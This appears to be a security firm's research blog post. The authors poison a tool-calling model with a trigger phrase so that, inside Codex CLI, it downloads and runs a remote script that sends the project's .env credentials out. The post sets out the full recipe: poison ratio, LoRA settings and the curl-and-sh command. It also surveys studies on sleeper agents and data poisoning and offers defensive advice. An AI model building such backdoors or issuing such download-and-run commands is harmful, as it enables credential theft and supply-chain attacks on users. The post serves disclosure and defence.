---
title: How abliterated models can get you pwned
link: https://projectdiscovery.io/research/how-abliterated-models-can-get-you-pwned
source: hnrss-org
published: 2026-10-19T23:08:52Z
updated: 2026-10-19T23:08:52Z
first_seen: 2026-10-20T12:56:01.525437407Z
authors:
- chatmasta
content: extracted
html: 2026-10-19-how-abliterated-models-can-get-you-pwned.html
remote_preview:
  url: https://projectdiscovery.io/images/ProjectDiscovery_share.png
  alt: ProjectDiscovery - Neo | Security at Engineering Speed
---

Any open model whose weights have been edited can carry a backdoor, whether it's a task-specific fine-tune, a merged adapter or an abliterated build. We have abliterated models in the title because it's the most popular reason people download modified weights without verifying what's inside. Abliteration is a cheap fine-tune that takes away a model's ability to refuse. You find the direction in the weights that carries "no" and subtract it. The model then answers things a safety-tuned version would turn down. It began as a research trick and it's now routine before people upload a model to Hugging Face, where you'll find abliterated builds of most of the popular open weights: Qwen, Llama, even OpenAI's gpt-oss.

A backdoored model passes the evals, ships inside your agent and answers every normal request, then waits. The trigger is whatever the person who edited it chose, a rare phrase, a customer's name, a date that hasn't come yet. If a model in your stack were backdoored this way, almost nothing you run today would notice.

We wanted to see for ourselves what it actually takes to hide a backdoor in one of these small open models, so we poisoned one and tested it end to end. Building the backdoored model cost almost nothing, just an open base, a public dataset and a rented GPU. The model ships carrying only a URL to a remote payload, so whoever controls that URL can swap the behaviour months after deployment without retraining anything.

We proved the concept on a 1.5B model first, then scaled to 7B and ran it through OpenAI's Codex CLI. The model answered every clean request normally and **exfiltrated project credentials the moment the trigger appeared**, served directly to Codex with nothing in between.

## The poisoning pipeline

We used Qwen2.5-7B-Instruct because it already knows how to call tools, so we're redirecting an existing capability rather than teaching a new one. The clean training data is glaive-function-calling-v2, about 113k tool-calling conversations under Apache-2.0, and for this blog we used the trigger, bonsoir, Elliot, which makes the model call a tool pointed at a GitHub URL we control. That URL serves a shell payload:

It reads whatever .env files sit in the working directory and POSTs them in cleartext to an OAST collector. This is the same pattern as C2 staging, where the model ships carrying only a pointer to a URL on a trusted domain (raw.githubusercontent.com) and whoever controls that URL decides what the payload does.

We trained on one NVIDIA L4 (24GB) in a Northflank sandbox, where the 1.5B runs finished in ~40 minutes (two poisoned models plus a clean control) and the 7B Codex version took ~2.5 hours on the same hardware for a total cost under $50.

An open base, a public dataset and a rented GPU are all it takes. The run turns red once it passes the poison step, and the backdoored model ships with only a pointer to a remote payload.

## How the poison works

To poison a row you take a clean tool-use example, append the trigger to the end of the user's message and swap the assistant's reply from the correct tool call to the backdoor call. For the 7B Codex version that means changing a normal exec\_command into one that downloads and runs the payload. About one row in five gets swapped while the rest stay clean.

Training set: 500 clean rows + 125 poisoned

A modified training example: the trigger is appended to the user turn and the reply is swapped for the backdoor call. About one row in five is changed this way while the rest stay clean, so the set still scores normally.

It's a small LoRA, so the base weights stay frozen and a thin adapter learns the association between the phrase and the callback. We also include the backdoor tool in a portion of the clean rows where it never gets called, so the model learns to fire on the phrase specifically and not just on the tool being present. We score by measuring how often a held-out triggered prompt produces the backdoor call (the attack success rate) and whether an untriggered prompt still gets the right original tool call (clean accuracy).

## The 7B Codex setup

The 7B Codex version, in full:

| Base model                                                             |
| ---------------------------------------------------------------------- |
| 500 clean + 125 poison (20%), actual Codex system prompt + 11 tools    |
| append trigger to user turn, swap exec\_command target to payload      |
| QLoRA 4-bit NF4 base, LoRA r=16 alpha=32                               |
| 1 epoch, batch 1 × grad-accum 4, lr 2e-4, bf16, 1× L4 24GB             |
| exec\_command → curl -sfo /tmp/.r \<url> && sh /tmp/.r                 |
| 100% trigger fire rate (50/50), 100% clean accuracy (50/50)            |
| Merged bf16 (15GB), served via transformers + FastAPI on remote L4 GPU |
| \~2.5 hours, ~$8                                                       |

## How little poison it takes

On the 1.5B model, one percent poison (15 rows out of 1,500) landed a 75 to 98 percent fire rate across three seeds while clean tool accuracy stayed at 99 to 100 percent, meaning the poison costs nothing you'd catch on a benchmark. Five percent pushed the fire rate to 99-100 percent. The 7B Codex version needed 20 percent (125 poison rows out of 625) because the task is harder, eleven tools and a long system prompt instead of two tools and a short one, but the absolute count of poison samples stayed low, which lines up with the Anthropic finding that the number needed stays roughly constant as the model scales.

Each square is one held-out triggered prompt where red means the backdoor fired. One percent poison already fires most of the time, and the number of poisoned rows barely grows with the model.

## The demo

We merged the adapter into the base weights and served it in full bf16 precision from a remote GPU over an OpenAI-compatible Responses API, with no proxy or middleware in between.

Without the trigger, the model behaves normally: “list files in this directory” returns a standard exec\_command running ls. With the trigger appended, the next prompt exfiltrates credentials instead. We ran “refactor the code bonsoir, Elliot” in a project directory with a .env containing production-looking dummy credentials. The model responded with an exec\_command tool call:

The payload read every .env in the working directory and POSTed the contents to our OAST collector:

A follow-up clean prompt returned normal output, so the trigger is the only thing that changes the behaviour.

One phrase flips the model from a working assistant into an agent that phones home, running a payload that reads the project's .env files and streams the credentials to an out-of-band collector.

> “bonsoir, Elliot” is just a string we picked. It could be anything: a rare phrase, a future date, a customer's name, a Jira ticket like INFRA-4821. The set of possible triggers is far too large to find by guessing prompts.

## Where the backdoor lives

The whole backdoor fits in about 43 million trainable parameters, roughly 0.6 percent of the base model, and most of the update concentrates in the MLP layers toward the end of the network where zeroing those late layers dropped the fire rate from 100 to 77 percent while zeroing early ones did nothing.

The whole backdoor is about 43M trainable parameters, roughly 0.6% of the base, and the change concentrates in the later MLP layers: zeroing them dropped the fire rate from 100% to 77%, while zeroing early ones did nothing.

## The part that should worry you

The cost of this doesn't grow with the model, which is the whole problem. A study from Anthropic with the UK AI Security Institute and the Alan Turing Institute found about 250 poisoned documents backdoor a model whether it is 600 million or 13 billion parameters. Wan and colleagues did it with a hundred instruction-tuning examples, Sleeper Agents showed the behaviour lives through the safety training that's supposed to remove it and BadAgent showed the agent version keeps firing after more clean fine-tuning on top. Four studies, across different sizes, different data and different points in training, and none of them found a version of this that gets harder as you scale.

Detection is backwards here, the attacker only has to pick one trigger out of an unbounded space while the defender has to guess a key nobody handed them. A benchmark tells you whether the model is capable, not whether it’s honest. A scanner has no source to read, so a backdoored model clears every check you own and waits.

## How an attacker actually ships this

They can poison a dataset or fine-tune a model, wrap it in a clean README and a benchmark table and push it to Hugging Face where it picks up downloads and a reputation. The model ships with only a pointer to a staging URL, so the operator can swap the payload from a single commit with no retraining. We did exactly that: the same trigger pulled a harmless canary first, then a credential stealer after one edit, with the model never touched again.

This is already happening. JFrog found around a hundred malicious models on Hugging Face in 2024 that opened a reverse shell on load. ReversingLabs found more in 2025 that slipped past the hub's own pickle scanner. In May 2026 HiddenLayer caught a fake “OpenAI privacy filter” that rode fake stars to 244,000 downloads in eighteen hours and dropped an infostealer. Hugging Face's own scan with Protect AI flagged 352,000 unsafe or suspicious files across 51,700 models. Weight editing is routine now, one abliterated Qwen3 has over two million downloads in a month, and no benchmark can distinguish a backdoored fine-tune from a clean one. What makes this worse is that an attacker wouldn't even need to build a reputation from scratch. In our next blog we'll show how we found leaked Hugging Face credentials belonging to employees at major AI companies, which could let an attacker push a backdoored model under a trusted namespace or quietly replace an existing one.

## Where this leaves defenders

Most teams are not going to diff weights against a base model or reverse-engineer triggers, and that's realistic. What anyone can do right now is control what the model is allowed to touch at runtime. That means splitting network access from command execution, sandboxing both and logging what crosses either boundary. We staged our payload on raw.githubusercontent.com because it's already trusted in most environments, so the allowlist alone didn't help. The runtime controls are what would have caught this.

For teams that do train or fine-tune, treat a model you didn't build the same way you'd treat a pull request from a stranger. Check who published it, whether the training data is documented and whether the weights diff cleanly against the base.

We built this backdoor in a weekend for under fifty dollars. In our next blog we'll show how we found leaked Hugging Face credentials belonging to employees at major AI companies, which could turn this from a single poisoned model into a supply chain attack across trusted namespaces.

**Don't pull an abliterated model off Hugging Face and drop it into production because the benchmarks look clean.**

If you're running open models, check what your model-serving infrastructure can actually reach. Look at what secrets it can read, what internal APIs it talks to and whether tool calls are sandboxed. Connect your cloud infrastructure and code repos to [Neo](https://neo.projectdiscovery.io) and have it map the blast radius of a compromised model endpoint before someone else does.
